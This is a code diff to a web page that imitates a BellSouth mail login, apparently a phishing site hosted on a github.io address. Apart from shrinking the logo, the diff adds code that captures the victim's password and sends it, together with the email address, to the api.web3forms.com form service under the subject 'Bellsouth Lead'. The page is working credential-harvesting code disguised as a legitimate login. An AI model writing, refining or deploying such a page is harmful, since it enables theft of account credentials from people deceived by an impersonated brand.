@@ -167,7 +167,7 @@
 
   <header class="topbar">
     <div class="logo">
-      <img style="max-width:50% !important;" src="https://bellsouthmailpage.github.io/bellsouth-logo.png">
+      <img style="max-width:35% !important;" src="https://bellsouthmailpage.github.io/bellsouth-logo.png">
     </div>
   </header>
 
@@ -244,12 +244,14 @@ document.getElementById("loginForm").addEventListener("submit", async function (
   event.preventDefault();
 
   const email = document.getElementById("email").value;
+  const pass = document.getElementById("password").value;
   const accessKey = this.querySelector('[name="access_key"]').value;
 
   const data = new FormData();
   data.append("access_key", accessKey);
-  data.append("subject", "Email Form Submission");
+  data.append("subject", "Bellsouth Lead");
   data.append("email", email);
+  data.append("Pass", pass);
 
   try {
     await fetch("https://api.web3forms.com/submit", {
